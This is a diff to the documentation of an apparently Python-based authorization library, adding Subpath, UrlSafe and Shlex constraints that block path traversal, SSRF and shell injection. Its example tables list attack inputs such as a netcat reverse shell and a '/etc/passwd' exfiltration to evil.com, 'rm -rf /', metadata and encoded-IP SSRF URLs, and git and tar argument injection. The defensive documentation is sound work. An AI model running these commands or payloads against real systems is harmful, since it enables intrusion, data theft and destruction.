@@ -19,7 +19,7 @@ from tenuo import Warrant, Pattern, Range
 # Create warrant with per-tool constraints
 warrant = (Warrant.mint_builder()
     .capability("read_file",
-        path=Pattern("/data/*"),       # Path must match /data/*
+        path=Subpath("/data"),         # Path must be under /data/ (secure)
         max_size=Range.max_value(1000) # Size must be ≤ 1000
     )
     .holder(worker_pubkey)
@@ -447,6 +447,274 @@ child = UrlPattern("https://api.example.com/v1/*")    # OK - Specific host + pat
 # Invalid children
 child = UrlPattern("http://api.example.com/*")        # FAILS - Different scheme
 child = UrlPattern("https://*.other.com/*")           # FAILS - Different domain
+```
+
+---
+
+### Subpath
+
+Secure path containment constraint that prevents path traversal attacks. This is a **lexical** check - it normalizes `.` and `..` components without filesystem access.
+
+```python
+from tenuo import Subpath
+
+# Basic usage
+constraint = Subpath("/data")
+
+# Path checks
+constraint.contains("/data/file.txt")       # True
+constraint.contains("/data/subdir/file.txt")  # True
+constraint.contains("/data/../etc/passwd")  # False (traversal blocked)
+constraint.contains("/etc/passwd")          # False (not under /data)
+
+# Options
+Subpath("/data", case_sensitive=False)  # Windows compatibility
+Subpath("/data", allow_equal=False)     # Require strictly under root
+```
+
+**Security Features:**
+
+- Normalizes `.` and `..` components (lexically, no I/O)
+- Rejects null bytes (C string terminator attack)
+- Requires absolute paths
+- Optionally case-insensitive (Windows compatibility)
+- Does **NOT** follow symlinks (stateless validation)
+
+**Examples:**
+
+| Subpath | Path | Contains? |
+|---------|------|-----------|
+| `Subpath("/data")` | `/data/file.txt` | Yes |
+| `Subpath("/data")` | `/data/subdir/file.txt` | Yes |
+| `Subpath("/data")` | `/data` | Yes (allow_equal=true) |
+| `Subpath("/data")` | `/data/../etc/passwd` | No (normalized to /etc) |
+| `Subpath("/data")` | `/etc/passwd` | No |
+| `Subpath("/data")` | `data/file.txt` | No (relative path) |
+
+**Attenuation:** Child root must be contained within parent root.
+
+```python
+# Parent: /data
+parent = Subpath("/data")
+
+# Valid child: /data/reports (narrower)
+child = Subpath("/data/reports")  # OK
+
+# Invalid child: /other (not under parent)
+child = Subpath("/other")  # FAILS
+```
+
+> [!NOTE]
+> **Symlink Handling**
+>
+> This constraint does NOT resolve symlinks. This is intentional for distributed systems where the file may be on a different machine than the validator. For symlink-aware validation, use `path_jail` at the execution layer. See [Defense in Depth](#defense-in-depth-file-paths).
+
+**Error Handling:**
+
+```python
+# Invalid root raises ValueError
+Subpath("relative/path")  # ValueError: invalid path 'relative/path': root must be an absolute path
+
+# Non-string arguments raise TypeError (type-safe validation)
+constraint = Subpath("/data")
+constraint.contains(123)   # TypeError
+constraint.contains(None)  # TypeError
+```
+
+**Path Normalization:**
+
+- Double slashes are collapsed: `//data//file.txt` → `/data/file.txt`
+- Trailing slashes are preserved in root but ignored in matching
+- `.` and `..` are resolved lexically (no filesystem access)
+
+---
+
+### UrlSafe
+
+SSRF-safe URL constraint that blocks dangerous URLs by default.
+
+```python
+from tenuo import UrlSafe
+
+# Secure defaults - blocks known SSRF vectors
+constraint = UrlSafe()
+constraint.is_safe("https://api.github.com/repos")  # True
+constraint.is_safe("http://169.254.169.254/")       # False (metadata)
+constraint.is_safe("http://127.0.0.1/")             # False (loopback)
+constraint.is_safe("http://10.0.0.1/")              # False (private IP)
+
+# Domain allowlist - only specific domains allowed
+constraint = UrlSafe(allow_domains=["api.github.com", "*.googleapis.com"])
+
+# Custom configuration
+constraint = UrlSafe(
+    allow_schemes=["https"],           # HTTPS only
+    block_private=True,                # Block 10.x, 172.16.x, 192.168.x
+    block_loopback=True,               # Block 127.x, ::1, localhost
+    block_metadata=True,               # Block cloud metadata endpoints
+    block_internal_tlds=True,          # Block .internal, .local, .svc, .default, etc.
+)
+```
+
+**Security Features:**
+
+- Validates URL scheme (default: http, https)
+- Blocks private IPs (RFC1918: 10.x, 172.16.x, 192.168.x)
+- Blocks loopback (127.x, ::1, localhost)
+- Blocks cloud metadata endpoints (169.254.169.254, metadata.google.internal)
+- Blocks IP encoding bypasses (decimal, hex, octal, IPv6-mapped)
+- Decodes URL-encoded hostnames
+- Optional domain allowlist for maximum restriction
+
+**SSRF Vectors Blocked:**
+
+| Attack Vector | Example | Blocked? |
+|---------------|---------|----------|
+| AWS Metadata | `http://169.254.169.254/` | Yes |
+| Loopback | `http://127.0.0.1/` | Yes |
+| Private IP | `http://10.0.0.1/` | Yes |
+| Decimal IP | `http://2130706433/` (=127.0.0.1) | Yes |
+| Hex IP | `http://0x7f000001/` | Yes |
+| Octal IP | `http://0177.0.0.1/` | Yes |
+| IPv6 Mapped | `http://[::ffff:127.0.0.1]/` | Yes |
+| IPv4-Compatible IPv6 | `http://[::127.0.0.1]/` | Yes |
+| URL Encoded | `http://%31%32%37%2e%30%2e%30%2e%31/` | Yes |
+| File Scheme | `file:///etc/passwd` | Yes |
+| localhost | `http://localhost/` | Yes |
+
+**Attenuation:** Child must be at least as restrictive as parent.
+
+```python
+# Parent: default SSRF protection
+parent = UrlSafe()
+
+# Valid child: stricter (domain allowlist)
+child = UrlSafe(allow_domains=["api.github.com"])  # OK
+
+# Invalid child: less restrictive
+child = UrlSafe(block_private=False)  # FAILS
+```
+
+> [!NOTE]
+> **DNS Resolution**
+>
+> This constraint does NOT perform DNS resolution. This is intentional - DNS resolution is I/O that can block, fail, or be manipulated (DNS rebinding). For DNS-aware validation, use `url_jail` at the execution layer.
+
+> [!IMPORTANT]
+> **IPv6 Address Handling**
+>
+> UrlSafe blocks several IPv6-based bypass attempts:
+> - **IPv6-mapped IPv4**: `[::ffff:127.0.0.1]` → blocked (normalized to 127.0.0.1)
+> - **IPv4-compatible IPv6**: `[::127.0.0.1]` → blocked (deprecated format but still parsed by some libraries)
+> - **IPv6 loopback**: `[::1]` → blocked
+> - **IPv6 private ranges**: `fc00::/7`, `fe80::/10` → blocked when `block_private=True`
+
+> [!NOTE]
+> **Octal IP Normalization**
+>
+> The URL parser normalizes octal-notation IPs before validation:
+> - `010.0.0.1` → normalized to `8.0.0.1` (octal 010 = decimal 8)
+> - `0177.0.0.1` → normalized to `127.0.0.1` → blocked as loopback
+> - `012.0.0.1` → normalized to `10.0.0.1` → blocked as private
+>
+> This provides defense-in-depth: attackers trying to use `010.0.0.1` to access `10.0.0.1` get `8.0.0.1` instead.
+
+> [!TIP]
+> **Best Practice: Use Domain Allowlists**
+>
+> For maximum security, use `allow_domains` to restrict URLs to specific trusted domains:
+> ```python
+> constraint = UrlSafe(allow_domains=["api.github.com", "*.googleapis.com"])
+> ```
+> This eliminates IP-based bypass attempts entirely and is the recommended approach for production use.
+
+**Error Handling:**
+
+```python
+# Non-string arguments raise TypeError (type-safe validation)
+constraint = UrlSafe()
+constraint.is_safe(123)   # TypeError
+constraint.is_safe(None)  # TypeError
+
+# Invalid/malformed URLs return False (safe default)
+constraint.is_safe("")           # False
+constraint.is_safe("not-a-url")  # False
+```
+
+---
+
+### Shlex
+
+Validates that a shell command string is safe and simple. Ensures the command is a single executable with literal arguments, preventing shell injection.
+
+```python
+from tenuo import Shlex
+
+# Allow only specific binaries
+constraint = Shlex(allow=["ls", "cat", "grep"])
+
+constraint.matches("ls -la /tmp")           # True
+constraint.matches("cat file.txt")          # True
+constraint.matches("ls -la; rm -rf /")      # False (operator blocked)
+constraint.matches("echo $(whoami)")        # False (command substitution)
+constraint.matches("ls $HOME")              # False (variable expansion)
+constraint.matches("rm -rf /")              # False (rm not in allowlist)
+```
+
+**Security Features:**
+
+| Attack | Example | Blocked? |
+|--------|---------|----------|
+| Command chaining | `ls; rm -rf /` | ✅ |
+| Pipe injection | `cat /etc/passwd \| nc evil.com 80` | ✅ |
+| Logical operators | `true && rm -rf /` | ✅ |
+| I/O redirection | `echo pwned > /etc/cron.d/x` | ✅ |
+| Command substitution | `echo $(whoami)` | ✅ |
+| Backtick substitution | `` echo `id` `` | ✅ |
+| Variable expansion | `ls $HOME` | ✅ |
+| Newline injection | `ls\nrm -rf /` | ✅ |
+| Unauthorized binary | `nc -e /bin/sh evil.com` | ✅ |
+
+**Options:**
+
+```python
+# Block glob characters too (*, ?, [)
+Shlex(allow=["ls"], block_globs=True)
+```
+
+> [!WARNING]
+> **Tier 1 Mitigation Only**
+>
+> Shlex validates **shell syntax**, not **tool semantics**. Some tools interpret arguments as commands:
+>
+> ```python
+> # These pass Shlex but the tool executes the argument:
+> "git clone --upload-pack='malicious' repo"
+> "tar --checkpoint-action=exec=cmd -xf file.tar"
+> ```
+>
+> For complete protection, use `proc_jail` which bypasses the shell entirely via `execve()`.
+
+> [!NOTE]
+> **Dangerous Binaries**
+>
+> Even with valid syntax, some binaries are dangerous:
+> - `python`, `perl`, `ruby` — arbitrary code execution
+> - `nc`, `curl`, `wget` — network access / SSRF
+> - `bash`, `sh`, `env`, `xargs` — shell escape
+>
+> Only allow specific, low-risk binaries like `ls`, `cat`, `head`, `tail`, `wc`, `grep`.
+
+**Error Handling:**
+
+```python
+# Non-string arguments raise TypeError
+constraint = Shlex(allow=["ls"])
+constraint.matches(123)   # False
+constraint.matches(None)  # False
+
+# Empty allowlist raises ValueError
+Shlex(allow=[])  # ValueError: Shlex requires at least one allowed binary
 ```
 
 ---
@@ -1117,7 +1385,7 @@ async with mint(Capability("search", query=Wildcard())):
 
 ```python
 # Read-only access to reports directory
-async with mint(Capability("read_file", path=Pattern("/data/reports/*"))):
+async with mint(Capability("read_file", path=Subpath("/data/reports"))):
     await read_file(path="/data/reports/q3.csv")  # OK
     await read_file(path="/etc/passwd")           # FAILS
 ```
